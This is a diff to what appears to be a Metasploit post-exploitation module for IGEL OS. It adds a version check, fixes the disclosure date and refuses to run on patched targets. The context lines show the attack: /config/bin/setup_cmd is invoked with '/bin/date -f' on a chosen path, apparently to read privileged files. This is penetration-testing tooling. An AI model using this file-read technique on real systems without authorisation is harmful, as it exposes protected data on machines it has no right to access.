@@ -4,6 +4,8 @@
 ##
 
 class MetasploitModule < Msf::Post
+  include Msf::Post::File
+
   def initialize(info = {})
     super(
       update_info(
@@ -17,7 +19,7 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Platform' => ['linux'],
         'SessionTypes' => ['shell', 'meterpreter'],
-        'DisclosureDate' => '2024-05-16',
+        'DisclosureDate' => '2024-03-07', # Patch release date
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [REPEATABLE_SESSION],
@@ -31,7 +33,30 @@ class MetasploitModule < Msf::Post
     ])
   end
 
+  def check
+    version = Rex::Version.new(
+      read_file('/etc/system-release').delete_prefix('IGEL OS').strip
+    )
+    unless version < Rex::Version.new('11.09.260')
+      return Exploit::CheckCode::Safe("IGEL OS #{version} is not vulnerable")
+    end
+
+    unless file?('/etc/setupd-usercommands.json')
+      return Exploit::CheckCode::Appears("IGEL OS #{version} appears to be vulnerable")
+    end
+
+    Exploit::CheckCode::Appears("IGEL OS #{version} should be vulnerable")
+  end
+
   def run
+    unless [
+      Exploit::CheckCode::Detected,
+      Exploit::CheckCode::Appears,
+      Exploit::CheckCode::Vulnerable
+    ].include?(check)
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
+    end
+
     print_status('Executing command on target')
     output = create_process('/config/bin/setup_cmd', args: ['/bin/date', '-f', datastore['RPATH']])
 
